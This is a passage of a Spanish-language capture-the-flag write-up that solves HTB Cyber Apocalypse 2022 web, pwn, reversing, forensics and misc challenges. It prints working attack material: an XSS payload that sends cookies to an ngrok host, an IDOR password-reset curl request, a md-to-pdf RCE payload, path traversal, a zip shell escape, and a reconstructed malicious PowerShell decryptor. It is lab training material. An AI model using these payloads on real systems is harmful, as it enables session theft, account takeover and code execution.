+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>img</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span> <span style=color:#a6e22e>onerror</span><span style=color:#f92672>=</span><span style=color:#e6db74>fetch(&#34;https://a748-189-203-27-57.ngrok.io/&#34;+document.cookie).then()</span> /&gt;
+</code></pre></div><p><img loading=lazy src=/images/posts/htb-cyber-apocalypse-2022/web/kryptos_support/xss_1.png alt="XSS Payload">
+</p>
+<p>Con la intención de robar una cookie de sesión correspondiente a la del admin, como lo menciona el sitio.</p>
+<p><img loading=lazy src=/images/posts/htb-cyber-apocalypse-2022/web/kryptos_support/xss_2.png alt="XSS Execution">
+</p>
+<p>De acuerdo a como está construida la cookie, se identificó que se trata de un JWT.</p>
+<p><img loading=lazy src=/images/posts/htb-cyber-apocalypse-2022/web/kryptos_support/jwt.png alt=JWT>
+</p>
+<p>Al buscar más información siendo que con la cookie de sesión no revela ningún cambio al utilizarla se identificó en el código fuente de <code>http://&lt;challenge url>/login</code> se revela un directorio disponible haciendo uso de la cookie obtenida.</p>
+<p><img loading=lazy src=/images/posts/htb-cyber-apocalypse-2022/web/kryptos_support/login_1.png alt="Login source code">
+</p>
+<p><code>login.js</code></p>
+<p><img loading=lazy src=/images/posts/htb-cyber-apocalypse-2022/web/kryptos_support/login_2.png alt="Feature discover">
+</p>
+<p>Vista de <code>http://&lt;challenge url>/tickets</code> haciendo uso de la cookie obtenida.</p>
+<p><img loading=lazy src=/images/posts/htb-cyber-apocalypse-2022/web/kryptos_support/tickets.png alt="Tickets url">
+</p>
+<p>Vista de <code>http://&lt;challenge url>/settings</code> haciendo uso de la cookie obtenida. Exponiendo la funcionalidad del cambio de contraseña del &ldquo;usuario logueado&rdquo;.</p>
+<p><img loading=lazy src=/images/posts/htb-cyber-apocalypse-2022/web/kryptos_support/settings_1.png alt="Settings url">
+</p>
+<p><img loading=lazy src=/images/posts/htb-cyber-apocalypse-2022/web/kryptos_support/settings_2.png alt="Settings source code">
+</p>
+<p>Al visualizar el código se puede identificar que el parámetro <code>uid</code> es enviado al hacer uso de la funcionalidad.</p>
+<p><img loading=lazy src=/images/posts/htb-cyber-apocalypse-2022/web/kryptos_support/settings_3.png alt="Settings js code">
+</p>
+<p>Buscando invocar la funcionalidad haciendo uso de <code>curl</code> se envió el uid del moderador como prueba.</p>
+<p><code>curl -v http://13868188223:30914/api/users/update -X POST -H "Content-Type: application/json" -d '{"password":"123456","uid":100}' --cookie "session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI2NDYxMzd9Z.HRsjja_ehTEx7FxfjilkTjO3_gRsHkt_jmovFZY1OA"</code></p>
+<p><img loading=lazy src=/images/posts/htb-cyber-apocalypse-2022/web/kryptos_support/password_1.png alt="Respuesta de cambio con moderador">
+</p>
+<p>Habiéndo mencionado que se envía el <code>uid</code> en la petición, se decidió cambiar el varlor a 1 siendo que generalmente se reserva ese id para administradores.</p>
+<p><img loading=lazy src=/images/posts/htb-cyber-apocalypse-2022/web/kryptos_support/password_2.png alt="Respuesta de cambio con uid 1">
+</p>
+<p>Al haber sido satisfactorio el cambio de contraseña se puede realizar el login como admin, obteniendo de esta manera la bandera.</p>
+<p><img loading=lazy src=/images/posts/htb-cyber-apocalypse-2022/web/kryptos_support/admin.png alt="Login como admin">
+</p>
+<blockquote>
+<p>Flag: HTB{x55_4nd_id0rs_ar3_fun!!}</p>
+</blockquote>
+<h3 id=blinkerfluids>BlinkerFluids<a hidden class=anchor aria-hidden=true href=#blinkerfluids>#</a></h3>
+<h4 id=stats-1>Stats<a hidden class=anchor aria-hidden=true href=#stats-1>#</a></h4>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Info</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Difficulty</td>
+<td>easy</td>
+</tr>
+<tr>
+<td>Description</td>
+<td>Once known as an imaginary liquid used in automobiles to make the blinkers work is now one of the rarest fuels invented on Klaus' home planet Vinyr. The Golden Fang army has a free reign over this miraculous fluid essential for space travel thanks to the Blinker Fluids™ Corp. Ulysses has infiltrated this supplier organization&rsquo;s one of the HR department tools and needs your help to get into their server. Can you help him?</td>
+</tr>
+<tr>
+<td>File</td>
+<td><a href=https://github.com/srrequiem/CTF-Challenge-Compilation/raw/main/202205_htb_cyber_apocalypse_ctf_2022_intergalactic_chase/files/web_blinkerfluids.zip>web_blinkerfluids.zip</a></td>
+</tr>
+</tbody>
+</table>
+<h4 id=solución-1>Solución<a hidden class=anchor aria-hidden=true href=#solución-1>#</a></h4>
+<p>Después de identificar la composición del código se encontró que:</p>
+<ul>
+<li>La bandera se encontraba en <code>/flag.txt</code>.</li>
+<li><a href=https://githubcom/simonhaenisch/md-to-pdf/issues/99>Una librería empleada es vulnerable a RCE (md-to-pdf)</a>.</li>
+<li>Por la configuación de la aplicación, sólo se permitía la obtención de archivos en el directorio <code>/static/invoices/</code>.</li>
+</ul>
+<p>Al capturar el contenido enviado se utilizó el payload <code>---js\n((require(\"child_process\"))execSync(\"cp /flag.txt /static/invoices/flag.txt\"))\n---RCE</code> como cuerpo del archivo markdown.</p>
+<p><img loading=lazy src=/images/posts/htb-cyber-apocalypse-2022/web/blinker_fluids/request.png alt="Request enviada">
+</p>
+<p>Ejecutando así el payload y permitiendo navegar a donde se encuentra la bandera</p>
+<p><img loading=lazy src=/images/posts/htb-cyber-apocalypse-2022/web/blinker_fluids/flag.png alt=Bandera>
+</p>
+<blockquote>
+<p>Flag: HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}</p>
+</blockquote>
+<h2 id=pwn>Pwn<a hidden class=anchor aria-hidden=true href=#pwn>#</a></h2>
+<h3 id=space-pirate-entrypoint>Space Pirate: Entrypoint<a hidden class=anchor aria-hidden=true href=#space-pirate-entrypoint>#</a></h3>
+<h4 id=stats-2>Stats<a hidden class=anchor aria-hidden=true href=#stats-2>#</a></h4>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Info</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Difficulty</td>
+<td>easy</td>
+</tr>
+<tr>
+<td>Description</td>
+<td>D12 is one of Golden Fang&rsquo;s missile launcher spaceships. Our mission as space pirates is to highjack D12, get inside the control panel room, and access the missile launcher system. To achieve our goal, we split the mission into three parts. In this part, all we need to do is bypass the scanning system and open the gates so that we proceed further.</td>
+</tr>
+<tr>
+<td>File</td>
+<td><a href=https://github.com/srrequiem/CTF-Challenge-Compilation/raw/main/202205_htb_cyber_apocalypse_ctf_2022_intergalactic_chase/files/pwn_sp_entrypoint.zip>pwn_sp_entrypoint.zip</a></td>
+</tr>
+</tbody>
+</table>
+<h4 id=solución-2>Solución<a hidden class=anchor aria-hidden=true href=#solución-2>#</a></h4>
+<p>Con los archivos que disponibles se probó localmente el binario y a modo de prueba y error, se identificó que al hacer uso de la contraseña <code>1234</code> el binario lee los contenidos del archivo local <code>flag.txt</code>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#ae81ff>1</span> Scan card 💳
+<span style=color:#ae81ff>2</span> Insert password ↪️
+&gt; <span style=color:#ae81ff>2</span>
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Insert password: <span style=color:#ae81ff>1234</span>
+
+<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Door opened, you can proceed with the passphrase: HTB<span style=color:#f92672>{</span>f4k3_fl4g_4_t35t1ng<span style=color:#f92672>}</span>
+
+<span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Invalid option! Intruder detected! 🚨 🚨
+</code></pre></div><p>Por lo que de la misma manera se realizó el mismo proceso en la conexión remota disponible.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#ae81ff>1</span> Scan card 💳
+<span style=color:#ae81ff>2</span> Insert password ↪️
+&gt; <span style=color:#ae81ff>2</span>
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Insert password: <span style=color:#ae81ff>1234</span>
+
+<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Door opened, you can proceed with the passphrase: HTB<span style=color:#f92672>{</span>th3_g4t35_4r3_0p3n!<span style=color:#f92672>}</span>
+<span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> Invalid option! Intruder detected! 🚨 🚨
+</code></pre></div><blockquote>
+<p>Flag: HTB{th3_g4t35_4r3_0p3n!}</p>
+</blockquote>
+<h2 id=reversing>Reversing<a hidden class=anchor aria-hidden=true href=#reversing>#</a></h2>
+<h3 id=wide>WIDE<a hidden class=anchor aria-hidden=true href=#wide>#</a></h3>
+<h4 id=stats-3>Stats<a hidden class=anchor aria-hidden=true href=#stats-3>#</a></h4>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Info</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Difficulty</td>
+<td>easy</td>
+</tr>
+<tr>
+<td>Description</td>
+<td>We&rsquo;ve received reports that Draeger has stashed a huge arsenal in the pocket dimension Flaggle Alpha. You&rsquo;ve managed to smuggle a discarded access terminal to the Widely Inflated Dimension Editor from his headquarters, but the entry for the dimension has been encrypted. Can you make it inside and take control?</td>
+</tr>
+<tr>
+<td>File</td>
+<td><a href=https://github.com/srrequiem/CTF-Challenge-Compilation/raw/main/202205_htb_cyber_apocalypse_ctf_2022_intergalactic_chase/files/rev_wide.zip>rev_wide.zip</a></td>
+</tr>
+</tbody>
+</table>
+<h4 id=solución-3>Solución<a hidden class=anchor aria-hidden=true href=#solución-3>#</a></h4>
+<p>Después de interactuar con el binario y ver las posibilidades ofrecidas, la opción que se visualiza como cifrada pide una contraseña para visualizar su contenido.</p>
+<p><img loading=lazy src=/images/posts/htb-cyber-apocalypse-2022/reversing/wide/initial.png alt="Uso inicial">
+</p>
+<p>Buscando el valor en duro mediante su ejecución en IDA, al revisar el flujo se puede ver un valor posible que pudiera ser usado como contraseña.</p>
+<p><img loading=lazy src=/images/posts/htb-cyber-apocalypse-2022/reversing/wide/ida.png alt="Flujo al cargar archivo">
+</p>
+<p>Obteniendo el valor: <code>sup3rs3cr3tw1d3</code>.</p>
+<p>Y al pasarse como contraseña, se obtuvo la bandera.</p>
+<p><img loading=lazy src=/images/posts/htb-cyber-apocalypse-2022/reversing/wide/flag.png alt=Bandera>
+</p>
+<blockquote>
+<p>Flag: HTB{str1ngs_4r3nt_4lw4ys_4sc11}</p>
+</blockquote>
+<h2 id=forensics>Forensics<a hidden class=anchor aria-hidden=true href=#forensics>#</a></h2>
+<h3 id=puppeteer>Puppeteer<a hidden class=anchor aria-hidden=true href=#puppeteer>#</a></h3>
+<h4 id=stats-4>Stats<a hidden class=anchor aria-hidden=true href=#stats-4>#</a></h4>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Info</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Difficulty</td>
+<td>easy</td>
+</tr>
+<tr>
+<td>Description</td>
+<td>Planet Longhir is known for it&rsquo;s top-tier researchers. Due to their dedication in science and engineering, their military equipment is the most advanced one in the galaxy. In fact, the prototype DES-3000, a self-propelled precision-strike missile that is capable of reaching targets even in Ratnik galaxy, is being used to disable Galactic Federation&rsquo;s communication satellites. The mystery that Miyuki is trying to solve is, how the satellite&rsquo;s location was leaked since it is a top-sercret that only Galactic Federation&rsquo;s council is aware of. Help her analyse the Council&rsquo;s HQ event logs and solve this mystery.</td>
+</tr>
+<tr>
+<td>File</td>
+<td><a href=https://github.com/srrequiem/CTF-Challenge-Compilation/raw/main/202205_htb_cyber_apocalypse_ctf_2022_intergalactic_chase/files/forensics_puppeteer.zip>forensics_puppeteer.zip</a></td>
+</tr>
+</tbody>
+</table>
+<h4 id=solución-4>Solución<a hidden class=anchor aria-hidden=true href=#solución-4>#</a></h4>
+<p>Se uso como base la solución de un <a href=https://josh-vrmediumcom/hackthebox-event-horizon-forensics-challenge-writeup-b32839a3307d>reto similar que anteriormente HackTheBox había publicado</a>, que fue encontrado al buscar como realizar análisis a los tipos de archivos dados.</p>
+<p>Al revisar el mismo archivo indicado en el writeup (<code>Microsoft-Windows-PowerShell%4Operationalevtx</code>), que por suerte, también existe en los logs de eventos, se puede visualizar una serie de eventos que tienen que ver con la descripción del reto (contexto del evento).</p>
+<p><img loading=lazy src=/images/posts/htb-cyber-apocalypse-2022/forensics/puppeteer/coincidencias.png alt="Coincidencias respecto al reto">
+</p>
+<p>En uno de ellos se encuentra algo que por su composición se asume que es shellcode, al tratar de interpretar que es lo realiza antes de ejecutarse se puede visualizar que el código concatena dos arreglos de bytes declarados antes del shellcode asignando este nuevo valor a otra variable y posteriormente realiza un XOR a cada elemento con <code>0xd1</code></p>
+<p><img loading=lazy src=/images/posts/htb-cyber-apocalypse-2022/forensics/puppeteer/stages.png alt="Stages de códigos">
+</p>
+<ol>
+<li>Declaración de stages</li>
+<li>Concatenación</li>
+<li>XOR a cada elemento</li>
+</ol>
+<p>Se imprimió esta variable para saber su contenido, el cual, al decodearse de los decimales obtenidos a ascii se obtuvo la bandera, haciendo uso de <a href="https://gchq.github.io/CyberChef/#recipe=From_Decimal('Line%20feed',false)&input=NzIKODQKNjYKMTIzCjk4CjUxCjExOQoxMDQKNTIKMTE0CjUxCjk1CjQ4CjEwMgo5NQoxMTYKMTA0CjUxCjk1Cjk4CjQ4CjQ4CjExNgo1Mwo5NQo0OAoxMDIKOTUKMTA2CjExNwoxMTUKMTE2CjQ5Cjk5CjUxCjQ2CjQ2CjQ2CjEyNQ">esta receta de CyberChef</a>.</p>
+<p>Modificación a script original:</p>
+<p><img loading=lazy src=/images/posts/htb-cyber-apocalypse-2022/forensics/puppeteer/modificacion.png alt="Modificación a script">
+</p>
+<p>Ejecución:</p>
+<p><img loading=lazy src=/images/posts/htb-cyber-apocalypse-2022/forensics/puppeteer/ejecucion.png alt="Ejecución de script">
+</p>
+<p>Decodeo de valores obtenidos para obtener bandera:</p>
+<p><img loading=lazy src=/images/posts/htb-cyber-apocalypse-2022/forensics/puppeteer/flag.png alt="Obtención de bandera">
+</p>
+<blockquote>
+<p>Flag: HTB{b3wh4r3_0f_th3_b00t5_0f_just1c3}</p>
+</blockquote>
+<h3 id=golden-persistence>Golden Persistence<a hidden class=anchor aria-hidden=true href=#golden-persistence>#</a></h3>
+<h4 id=stats-5>Stats<a hidden class=anchor aria-hidden=true href=#stats-5>#</a></h4>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Info</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Difficulty</td>
+<td>easy</td>
+</tr>
+<tr>
+<td>Description</td>
+<td>Emergency! A space station near Urkir was compromised. Although Urkir is considered to be the very embodiment of the neutral state, it is rich of fuel substances, something that Dreager is very much interested in. Thus, there are now fears that the intergalactic war will also affect this neutral planet. If Draeger and his mercenaries manage to maintain unauthorised access in Urkir&rsquo;s space station and escalate their privileges, they will soon be able to activate the station&rsquo;s defence mechanisms that are able to prevent any spaceship from entering Urkir&rsquo;s airspace. For now, the infected machine is isolated until the case is closed. Help Miyuki find their persistence mechanisms so they cannot gain access again.</td>
+</tr>
+<tr>
+<td>File</td>
+<td><a href=https://github.com/srrequiem/CTF-Challenge-Compilation/raw/main/202205_htb_cyber_apocalypse_ctf_2022_intergalactic_chase/files/forensics_golden_persistence.zip>forensics_golden_persistence.zip</a></td>
+</tr>
+</tbody>
+</table>
+<h4 id=solución-5>Solución<a hidden class=anchor aria-hidden=true href=#solución-5>#</a></h4>
+<p>Después de investigar acerca del análisis del archivo dado (<code>NTUSER.dat</code>), se encontró este <a href="https://www.youtube.com/watch?v=VmKvYRyTixw">write-up</a> en el que se hace uso de diferentes herramientas para análizar y navegar entre los registros del archivo, del cuál en el registro <code>/Software/Microsoft/Windows/CurrentVersion/Run</code> se identificó el uso de powershell con un parámetro poco convencional. Haciendo uso de <code>reglookup -p /Software/Microsoft/Windows/CurrentVersion/Run NTUSER.DAT</code>.</p>
+<p><img loading=lazy src=/images/posts/htb-cyber-apocalypse-2022/forensics/golden_persistence/reglookup_1.png alt="Registro poco convencional">
+</p>
+<p>Después de identificar que el parámetro se encontraba codificado en base64 y desencodeándolo, se puede visualizar el script utilizado.</p>
+<p><img loading=lazy src=/images/posts/htb-cyber-apocalypse-2022/forensics/golden_persistence/decodeo.png alt="Decodeo de base64">
+</p>
+<p>De acuerdo al código, el script hace uso de los valores de los registros indicados por lo que en pasos consiguientes fue necesario buscar los mismos.</p>
+<p><img loading=lazy src=/images/posts/htb-cyber-apocalypse-2022/forensics/golden_persistence/registros.png alt="Obtención de valor de registros">
+</p>
+<p>Extrayendo de la misma manera los valores se pueden sustituir las variables correspondientes directamente.</p>
+<p><img loading=lazy src=/images/posts/htb-cyber-apocalypse-2022/forensics/golden_persistence/valores_cifrados.png alt="Valores cifrados">
+</p>
+<p>Al ejecutar la reconstrucción del script, aún presentaba inconsistencias de sintaxis, al limpiarlo para buscar una ejecución correcta quedó de la <a href=#script-completo>siguiente manera</a></p>
+<p><img loading=lazy src=/images/posts/htb-cyber-apocalypse-2022/forensics/golden_persistence/inconsistencias.png alt="Ejemplo de inconsistencias">
+</p>
+<h5 id=script-completo>Script completo<a hidden class=anchor aria-hidden=true href=#script-completo>#</a></h5>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#66d9ef>function</span> encr {
+    <span style=color:#66d9ef>param</span>(
+        <span style=color:#66d9ef>[Byte[]]</span>$data,
+        <span style=color:#66d9ef>[Byte[]]</span>$key
+      )
+
+    <span style=color:#66d9ef>[Byte[]]</span>$buffer = New-Object Byte[] $data.Length
+    $data.CopyTo($buffer, 0)
+
+    <span style=color:#66d9ef>[Byte[]]</span>$s = New-Object Byte[] 256;
+    <span style=color:#66d9ef>[Byte[]]</span>$k = New-Object Byte[] 256;
+
+    <span style=color:#66d9ef>for</span> ($i = 0; $i <span style=color:#f92672>-lt</span> 256; $i++)
+    {
+        $s[$i] = <span style=color:#66d9ef>[Byte]</span>$i;
+        $k[$i] = $key[$i % $key.Length];
+    }
+
+    $j = 0;
+    <span style=color:#66d9ef>for</span> ($i = 0; $i <span style=color:#f92672>-lt</span> 256; $i++)
+    {
+        $j = ($j + $s[$i] + $k[$i]) % 256;
+        $temp = $s[$i];
+        $s[$i] = $s[$j];
+        $s[$j] = $temp;
+    }
+
+    $i = $j = 0;
+    <span style=color:#66d9ef>for</span> ($x = 0; $x <span style=color:#f92672>-lt</span> $buffer.Length; $x++)
+    {
+        $i = ($i + 1) % 256;
+        $j = ($j + $s[$i]) % 256;
+        $temp = $s[$i];
+        $s[$i] = $s[$j];
+        $s[$j] = $temp;
+        <span style=color:#66d9ef>[int]</span>$t = ($s[$i] + $s[$j]) % 256;
+        $buffer[$x] = $buffer[$x] <span style=color:#f92672>-bxor</span> $s[$t];
+    }
+
+    <span style=color:#66d9ef>return</span> $buffer
+}
+
+
+<span style=color:#66d9ef>function</span> HexToBin {
+    <span style=color:#66d9ef>param</span>(
+    [<span style=color:#66d9ef>Parameter</span>(
+        <span style=color:#66d9ef>Position</span>=0,
+        <span style=color:#66d9ef>Mandatory</span>=$true,
+        <span style=color:#66d9ef>ValueFromPipeline</span>=$true)
+    ]
+    <span style=color:#66d9ef>[string]</span>$s)
+    $return = @()
+
+    <span style=color:#66d9ef>for</span> ($i = 0; $i <span style=color:#f92672>-lt</span> $s.Length ; $i += 2)
+    {
+        $return += <span style=color:#66d9ef>[Byte]</span>::Parse($s.Substring($i, 2), <span style=color:#66d9ef>[System.Globalization.NumberStyles]</span>::HexNumber)
+    }
+
+    Write-Output $return
+}
+
+$enc = <span style=color:#66d9ef>[System.Text.Encoding]</span>::ASCII
+<span style=color:#66d9ef>[Byte[]]</span>$key = $enc.GetBytes(<span style=color:#e6db74>&#34;Q0mmpr4B5rvZi3pS&#34;</span>)
+<span style=color:#75715e>#$encrypted1 = (Get-ItemProperty -Path HKCU:\SOFTWARE\ZYb78P4s).t3RBka5tL</span>
+<span style=color:#75715e>#$encrypted2 = (Get-ItemProperty -Path HKCU:\SOFTWARE\BjqAtIen).uLltjjW</span>
+<span style=color:#75715e>#$encrypted3 = (Get-ItemProperty -Path HKCU:\SOFTWARE\AppDataLow\t03A1Stq).uY4S39Da</span>
+<span style=color:#75715e>#$encrypted4 = (Get-ItemProperty -Path HKCU:\SOFTWARE\Google\Nv50zeG).Kb19fyhl</span>
+<span style=color:#75715e>#$encrypted5 = (Get-ItemProperty -Path HKCU:\AppEvents\Jx66ZG0O).jH54NW8C</span>
+$encrypted1 = <span style=color:#e6db74>&#34;F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39&#34;</span>
+$encrypted2 = <span style=color:#e6db74>&#34;CC19F66A5F3B2E36C9B810FE7CC4D9CE342E8E00138A4F7F5CDD9EED9E09299DD7C6933CF4734E12A906FD9CE1CA57D445DB9CABF850529F5845083F34BA1&#34;</span>
+$encrypted3 = <span style=color:#e6db74>&#34;C08114AA67EB979D36DC3EFA0F62086B947F672BD8F966305A98EF93AA39076C3726B0EDEBFA10811A15F1CF1BEFC78AFC5E08AD8CACDB323F44B4D&#34;</span>
+$encrypted4 = <span style=color:#e6db74>&#34;D814EB4E244A153AF8FAA1121A5CCFD0FEAC8DD96A9B31CCF6C3E3E03C1E93626DF5B3E0B141467116CC08F92147F7A0BE0D95B0172A7F34922D6C236BC7DE54D8ACBFA70D1&#34;</span>
+$encrypted5 = <span style=color:#e6db74>&#34;84AB553E67C743BE696A0AC80C16E2B354C2AE7918EE08A0A3887875C83E44ACA7393F1C579EE41BCB7D336CAF8695266839907F47775F89C1F170562A6B0A01C0F3BC4CB&#34;</span>
+$encrypted = <span style=color:#e6db74>&#34;</span>$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)<span style=color:#e6db74>&#34;</span>
+<span style=color:#66d9ef>[Byte[]]</span>$data = HexToBin $encrypted
+$DecryptedBytes = encr $data $key
+$DecryptedString = $enc.GetString($DecryptedBytes)
+$DecryptedString
+<span style=color:#75715e>#$DecryptedString|iex</span>
+</code></pre></div><p>Del cuál al ejecutarse se obtiene el valor original del parámetro ejecutado, encontrando de esta manera la bandera.</p>
+<p><img loading=lazy src=/images/posts/htb-cyber-apocalypse-2022/forensics/golden_persistence/payload.png alt="Payload ejecutado">
+</p>
+<blockquote>
+<p>Flag: HTB{g0ld3n_F4ng_1s_n0t_st34lthy_3n0ugh}</p>
+</blockquote>
+<h2 id=misc>Misc<a hidden class=anchor aria-hidden=true href=#misc>#</a></h2>
+<h3 id=compressor>Compressor<a hidden class=anchor aria-hidden=true href=#compressor>#</a></h3>
+<h4 id=stats-6>Stats<a hidden class=anchor aria-hidden=true href=#stats-6>#</a></h4>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Info</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Difficulty</td>
+<td>easy</td>
+</tr>
+<tr>
+<td>Description</td>
+<td>Ramona&rsquo;s obsession with modifications and the addition of artifacts to her body has slowed her down and made her fail and almost get killed in many missions. For this reason, she decided to hack a tiny robot under Golden Fang&rsquo;s ownership called &ldquo;Compressor&rdquo;, which can reduce and increase the volume of any object to minimize/maximize it according to the needs of the mission. With this item, she will be able to carry any spare part she needs without adding extra weight to her back, making her fast. Can you help her take it and hack it?</td>
+</tr>
+<tr>
+<td>File</td>
+<td>-</td>
+</tr>
+</tbody>
+</table>
+<h4 id=solución-6>Solución<a hidden class=anchor aria-hidden=true href=#solución-6>#</a></h4>
+<p>Para este reto se exponía una conexión a un host en donde se ofrecían diferentes opciones para interactuar con el binario disponible.</p>
+<p>De acuerdo a la interacción se encontraron 2 formas de resolver el reto, mediante un <strong>Path traversal</strong> haciendo uso de la ejecución de <code>cat</code> disponible.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>└─$ nc 138.68.183.64 <span style=color:#ae81ff>31076</span>
+
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Directory to work in: tHV1tdX82QcPllglF8wa6AhU24FRZS4S
+
+Component List:
+
++<span style=color:#f92672>===============</span>+
+|               |
+|  1. Head  🤖  |
+|  2. Torso 🦴   |
+|  3. Hands 💪  |
+|  4. Legs  🦵   |
+|               |
++<span style=color:#f92672>===============</span>+
+
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Choose component: <span style=color:#ae81ff>1</span>
+
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sub-directory to work in: tHV1tdX82QcPllglF8wa6AhU24FRZS4S/Head
+
+
+Actions:
+
+1. Create artifact
+2. List directory    <span style=color:#f92672>(</span>pwd; ls -la<span style=color:#f92672>)</span>
+3. Read artifact     <span style=color:#f92672>(</span>cat ./&lt;name&gt;<span style=color:#f92672>)</span>
+4. Compress artifact <span style=color:#f92672>(</span>zip &lt;name&gt;.zip &lt;name&gt; &lt;options&gt;<span style=color:#f92672>)</span>
+5. Change directory  <span style=color:#f92672>(</span>cd &lt;dirname&gt;<span style=color:#f92672>)</span>
+6. Clean directory   <span style=color:#f92672>(</span>rm -rf ./*<span style=color:#f92672>)</span>
+7. Exit
+
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Choose action: <span style=color:#ae81ff>3</span>
+
+
+Insert name you want to read: ../../flag.txt
+HTB<span style=color:#f92672>{</span>GTFO_4nd_m4k3_th3_b35t_4rt1f4ct5<span style=color:#f92672>}</span>
+</code></pre></div><p>Y también por medio de la utilidad expuesta de <code>zip</code> se encuentra un <a href=https://gtfobins.github.io/gtfobins/zip/#shell>GTFOBin</a> el cuál permite la invocación de una shell.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>Actions:
+
+1. Create artifact
+2. List directory    <span style=color:#f92672>(</span>pwd; ls -la<span style=color:#f92672>)</span>
+3. Read artifact     <span style=color:#f92672>(</span>cat ./&lt;name&gt;<span style=color:#f92672>)</span>
+4. Compress artifact <span style=color:#f92672>(</span>zip &lt;name&gt;.zip &lt;name&gt; &lt;options&gt;<span style=color:#f92672>)</span>
+5. Change directory  <span style=color:#f92672>(</span>cd &lt;dirname&gt;<span style=color:#f92672>)</span>
+6. Clean directory   <span style=color:#f92672>(</span>rm -rf ./*<span style=color:#f92672>)</span>
+7. Exit
+
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Choose action: <span style=color:#ae81ff>4</span>
+
+
+Insert &lt;name&gt;.zip:
+Insert &lt;name&gt;: /etc/passwd
+Insert &lt;options&gt;: -T -TT <span style=color:#e6db74>&#39;sh #&#39;</span>
+  adding: etc/passwd <span style=color:#f92672>(</span>deflated 62%<span style=color:#f92672>)</span>
+ls -la
+total <span style=color:#ae81ff>12</span>
+drwxr-sr-x    <span style=color:#ae81ff>2</span> ctf      ctf           <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>18</span> 23:01 .
+drwxr-sr-x    <span style=color:#ae81ff>6</span> ctf      ctf           <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>18</span> 23:00 ..
+-rw-------    <span style=color:#ae81ff>1</span> ctf      ctf            <span style=color:#ae81ff>650</span> May <span style=color:#ae81ff>18</span> 23:01 zikfJpfK
+cd ..
+ls -la
+total <span style=color:#ae81ff>24</span>
+drwxr-sr-x    <span style=color:#ae81ff>6</span> ctf      ctf           <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>18</span> 23:00 .
+drwxr-sr-x    <span style=color:#ae81ff>1</span> ctf      ctf           <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>18</span> 23:00 ..
+drwxr-sr-x    <span style=color:#ae81ff>2</span> ctf      ctf           <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>18</span> 23:00 Hands
+drwxr-sr-x    <span style=color:#ae81ff>2</span> ctf      ctf           <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>18</span> 23:01 Head
+drwxr-sr-x    <span style=color:#ae81ff>2</span> ctf      ctf           <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>18</span> 23:00 Legs
+drwxr-sr-x    <span style=color:#ae81ff>2</span> ctf      ctf           <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>18</span> 23:00 Torso
+cd ..
+ls -la
+total <span style=color:#ae81ff>44</span>
+drwxr-sr-x    <span style=color:#ae81ff>1</span> ctf      ctf           <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>18</span> 23:00 .
+drwxr-xr-x    <span style=color:#ae81ff>1</span> root     root          <span style=color:#ae81ff>4096</span> Mar  <span style=color:#ae81ff>3</span> 15:18 ..
+drwxr-sr-x    <span style=color:#ae81ff>6</span> ctf      ctf           <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>18</span> 22:57 5pSXN8iJRdGc7Y8nk5oNcKcrJKFTPK21
